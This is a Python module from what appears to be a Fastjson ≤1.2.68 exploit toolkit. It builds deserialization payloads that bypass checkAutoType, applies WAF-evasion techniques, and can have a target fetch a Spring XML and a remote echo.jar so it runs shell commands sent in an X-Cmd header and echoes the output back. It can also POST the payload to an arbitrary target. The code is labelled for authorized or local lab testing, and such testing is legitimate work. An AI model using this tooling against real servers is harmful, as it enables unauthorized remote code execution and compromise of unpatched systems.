"""Fastjson ≤1.2.68 证明 PoC：生成 payload，可选 POST 到授权目标。"""

from __future__ import annotations

import base64
from pathlib import Path
from typing import Optional

import httpx

from fastjson_toolkit.poc.echo import (
    build_echo_artifact,
    build_spring_echo_xml,
    normalize_engine,
    supports_1268_echo,
)
from fastjson_toolkit.poc.getter import wrap_with_currency
from fastjson_toolkit.poc.v1_2_68.catalog import get_gadget, list_gadgets
from fastjson_toolkit.poc.v1_2_68.models import (
    Poc1268GenerateOptions,
    Poc1268GenerateResult,
    Poc1268SendOptions,
    Poc1268SendResult,
)
from fastjson_toolkit.poc.v1_2_68.payloads import build_payload
from fastjson_toolkit.waf import apply_waf_payload

COMMON_NOTES = [
    "原理：双 @type，首个 java.lang.AutoCloseable 作 expectClass，"
    "绕过 checkAutoType（≤1.2.68；1.2.69 起 AutoCloseable 进黑名单）。",
    "仅用于授权测试 / 本地靶场。依赖靶场：http://127.0.0.1:18268/api/fastjson",
    "payload 含重复 @type / StringCodec 畸形写法，勿再 json.dumps 规范化。",
    "getter：$ref 已内嵌；业务点另有期望类时可开 wrap_currency 套 Currency"
    "（MiscCodec，与版本无关）。",
    "命令回显：仅 postgresql_ssrf（Spring ClassPathXml + 远程 echo.jar）支持。",
]

DEFAULT_ATTACK_BASE = "http://127.0.0.1:18080/attack"
_LAB_ATTACK = (
    Path(__file__).resolve().parents[4] / "lab" / "fastjson-1268-lab" / "attack"
)
# 1268 靶场可能无独立 attack 目录，回退到 1280 共享 attack
_FALLBACK_ATTACK = (
    Path(__file__).resolve().parents[4] / "lab" / "fastjson-1280-lab" / "attack"
)


def _decode_echo_output(headers: dict[str, str], body: str) -> Optional[str]:
    lower = {str(k).lower(): v for k, v in headers.items()}
    b64 = lower.get("x-echo")
    if b64:
        try:
            return base64.b64decode(b64).decode("utf-8", errors="replace")
        except Exception:  # noqa: BLE001
            pass
    text = (body or "").strip()
    if text and (lower.get("x-echo-cmd") or lower.get("x-echo-engine")):
        if "Internal Server Error" not in text:
            return text
    return None


def generate_poc_1268(
    options: Optional[Poc1268GenerateOptions] = None,
) -> Poc1268GenerateResult:
    opts = options or Poc1268GenerateOptions()
    entry = get_gadget(opts.gadget)

    socket_arg = opts.socket_factory_arg
    echo_on = bool(opts.echo)
    engine = ""
    cmd_header = ""
    jar_b64: Optional[str] = None
    xml_b64: Optional[str] = None
    extra_notes: list[str] = []

    if echo_on:
        if not supports_1268_echo(entry.id):
            raise ValueError(
                f"gadget={entry.id} 不支持命令回显；仅 postgresql_ssrf 可嵌 Spring XML 回显"
            )
        engine = normalize_engine(opts.engine)
        cmd_header = (opts.cmd_header or "X-Cmd").strip() or "X-Cmd"
        base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
        art = build_echo_artifact(
            engine=engine,
            cmd_header=cmd_header,
            default_cmd=opts.cmd or "id",
            class_name="EchoPayload",
            banner="FJ1268-ECHO",
        )
        jar_bytes = art.as_jar()
        jar_url = f"{base}/echo.jar"
        xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
        xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
        socket_arg = f"{base}/bean-echo.xml"
        for attack_dir in (_LAB_ATTACK, _FALLBACK_ATTACK):
            try:
                attack_dir.mkdir(parents=True, exist_ok=True)
                (attack_dir / "echo.jar").write_bytes(jar_bytes)
                (attack_dir / "bean-echo.xml").write_bytes(xml_bytes)
                extra_notes.append(f"已写入 {attack_dir / 'echo.jar'} 与 bean-echo.xml")
                break
            except OSError:
                continue
        else:
            extra_notes.append("无法写入 lab attack；请自行托管（见 attack_*_b64）")
        extra_notes.append(
            f"回显：engine={engine}，Header {cmd_header}={opts.cmd or 'id'}；"
            f"socketFactoryArg → {socket_arg}"
        )

    raw = build_payload(
        entry.id,
        file=opts.file,
        content=opts.content,
        source=opts.source,
        url=opts.url,
        guess_byte=opts.guess_byte,
        bom_bytes=opts.bom_bytes,
        host=opts.host,
        port=opts.port,
        user=opts.user,
        jdbc_url=opts.jdbc_url,
        socket_factory_arg=socket_arg,
    )
    if opts.wrap_currency:
        raw = wrap_with_currency(raw, currency_field=opts.currency_field)
    payload, waf_techs, waf_notes = apply_waf_payload(
        raw, opts.waf_techniques, opts.waf_options
    )
    notes = list(COMMON_NOTES)
    notes.append(entry.description)
    notes.extend(extra_notes)
    if opts.wrap_currency:
        notes.append(
            f"已套 java.util.Currency（字段 {opts.currency_field}）以触发 getter。"
        )
    notes.extend(waf_notes)
    return Poc1268GenerateResult(
        ok=True,
        gadget=entry.id,
        title=entry.title,
        payload=payload,
        payload_raw=raw if waf_techs else None,
        wrap_currency=opts.wrap_currency,
        waf_techniques=waf_techs,
        notes=notes,
        requires=list(entry.requires),
        jdk=entry.jdk,
        echo=echo_on,
        engine=engine,
        cmd_header=cmd_header,
        attack_jar_b64=jar_b64,
        attack_xml_b64=xml_b64,
    )


def run_poc_1268(
    options: Optional[Poc1268SendOptions] = None,
) -> Poc1268SendResult:
    opts = options or Poc1268SendOptions()
    gen = generate_poc_1268(opts)
    summary = f"已生成 {gen.title} payload（未发送）"
    if gen.waf_techniques:
        summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
    if gen.echo:
        summary += f"；echo={gen.engine} header={gen.cmd_header}"
    result = Poc1268SendResult(
        ok=True,
        gadget=gen.gadget,
        title=gen.title,
        payload=gen.payload,
        payload_raw=gen.payload_raw,
        wrap_currency=gen.wrap_currency,
        waf_techniques=gen.waf_techniques,
        sent=False,
        summary=summary,
        notes=gen.notes,
        requires=gen.requires,
        jdk=gen.jdk,
        echo=gen.echo,
        engine=gen.engine,
        cmd_header=gen.cmd_header,
        attack_jar_b64=gen.attack_jar_b64,
        attack_xml_b64=gen.attack_xml_b64,
    )
    if not opts.send:
        return result

    target = opts.target.strip()
    if not target:
        result.ok = False
        result.summary = "target 不能为空"
        return result

    headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
    if gen.echo and gen.cmd_header:
        headers.setdefault(gen.cmd_header, opts.cmd or "id")
    try:
        with httpx.Client(
            timeout=opts.timeout,
            proxy=opts.proxy,
            verify=not opts.insecure,
            follow_redirects=True,
            trust_env=False,
        ) as client:
            resp = client.post(target, content=gen.payload.encode("utf-8"), headers=headers)
    except Exception as exc:  # noqa: BLE001
        result.ok = False
        result.sent = True
        result.summary = f"发送失败: {exc}"
        result.raw = {"error": str(exc)}
        return result

    preview = (resp.text or "")[:2000]
    resp_headers = {str(k): str(v) for k, v in resp.headers.items()}
    echo_out = _decode_echo_output(resp_headers, resp.text or "") if gen.echo else None
    result.sent = True
    result.status_code = resp.status_code
    result.response_preview = preview
    result.echo_output = echo_out
    result.raw = {
        "status_code": resp.status_code,
        "headers": resp_headers,
    }
    result.ok = True
    if echo_out:
        result.summary = f"已 POST {gen.title} → HTTP {resp.status_code}；回显成功"
    else:
        result.summary = (
            f"已 POST {gen.title} → HTTP {resp.status_code}"
            "（请结合 /api/markers / 报错 / DNS / 回显头确认）"
        )
    return result


__all__ = [
    "COMMON_NOTES",
    "generate_poc_1268",
    "list_gadgets",
    "run_poc_1268",
]
